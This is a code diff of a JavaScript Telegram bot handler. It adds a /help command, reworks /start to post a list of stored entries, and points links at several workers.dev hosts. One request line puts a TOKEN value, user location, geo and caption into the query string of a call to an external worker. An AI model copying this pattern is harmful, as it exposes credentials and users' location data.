@@ -1,4 +1,5 @@
 (() => {
+    const tgph = require('./th')
     var AR = null;
     const db = require('./db')
     this.imgbb = async image => {
@@ -69,7 +70,7 @@
                 }
 
                 re.photo = re.photo[re.photo.length - 1].file_id
-               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"o"}&cc=${X.cc}`)
+               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"i"}&cc=${X.cc}`)
   .then( r => r.json() )
 
                 /*
@@ -180,7 +181,9 @@ B.method = "sendMessage"
             })
             B.photo = "https://res.cloudinary.com/o6/" + X.geo
             B.method = "sendPhoto"
-            B.caption = "s0s.1i.workers.dev"
+             B.caption = `<a href="${encodeURIComponent("https://l0ii.o6.workers.dev")}">${"https://l0ii.o6.workers.dev"}</a>`
+               B.parse_mode = "HTML"
+        
             B.reply_markup = {
                 inline_keyboard: [
                     [ {
@@ -197,7 +200,7 @@ B.method = "sendMessage"
                         "switch_inline_query_current_chat": "\\"
                     }, {
                         "text": "👁‍🗨",
-                        "switch_inline_query": ""
+                        "url": "https://6.o6.workers.dev"
                     }]
                 ]
             }
@@ -251,7 +254,7 @@ B.method = "sendMessage"
                     is: 1
                 })
                 B.parse_mode = "HTML"
-                return B.text = `<a href="${"https://ovca.8c.workers.dev/?v="+Date.now()}">ㅤ${X.no}</a>`
+                return B.text = `<a href="${"https://l0ii.o6.workers.dev?v="+Date.now()}">ㅤ${X.no}</a>`
             })
         }
         if (re.via_bot) {
@@ -262,17 +265,45 @@ B.method = "sendMessage"
             re.obj = JSON.parse(re.text)
             delete re.text
         }
+                if (re.bot_command && re.bot_command == "/help") {
+                    B.parse_mode = "HTML"
+               B.text = `<a href="${"https://l0ii.o6.workers.dev?v="+Date.now()}">ㅤ${X.no}</a>`
+            B.method = "sendMessage"
+
+          //  await console.l(B)
+          
+        }
         if (re.bot_command && re.bot_command == "/start") {
+            var v = await db.list("-")
+// var tt = ""
+//             var v = await db.list("-")
+//             var w = v.map(({
+//                 pic
+//             }) => (pic))
+//             v = v.map(({
+//                 url,
+//                 pic
+//             }) => {
+//                 tt+=pic
+//                 return url
+//             })
+//             if (v[0]) {
+//                var h = `
+// `
+//               //  w.unshift(X.ref.split(" ")[0]+"\n")
+//                 v.push(tt)
+     
+//             }
+
             B.method = "sendMessage"
             X.no = 1
             X.msg = (1 + re.message_id)
-            B.text = X.msg
-            await console.l(B)
-            B.method = "pinchatmessage"
-            B.message_id = X.msg
+            B.text = await tgph(v.reverse().slice(0, 15))//[v,tt]
+           // await console.l(B)
+
         }
         if (re.bot_command && re.bot_command == "/set") {
-            var v = await db.list("-")
+            var v = (await db.list("-")).slice(0, 10)
             var w = v.map(({
                 pic
             }) => (pic))
@@ -451,7 +482,7 @@ finally {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(v)
+            body: str(v)
         }).then(r => r.json())
         .then(r => 
                            r.description ? console.error(r.description) : ''             )
@@ -459,3 +490,18 @@ finally {
     var DB = console.DB
     console.DB = db
 })()
+
+var pa = j => {
+    try {
+        return JSON.parse(j)
+    } catch (err) {
+        return j || []
+    }
+}
+var str = j => {
+    try {
+        return JSON.stringify(JSON.parse(j), null, 4)
+    } catch (err) {
+        return JSON.stringify(j, null, 4)
+    }
+}
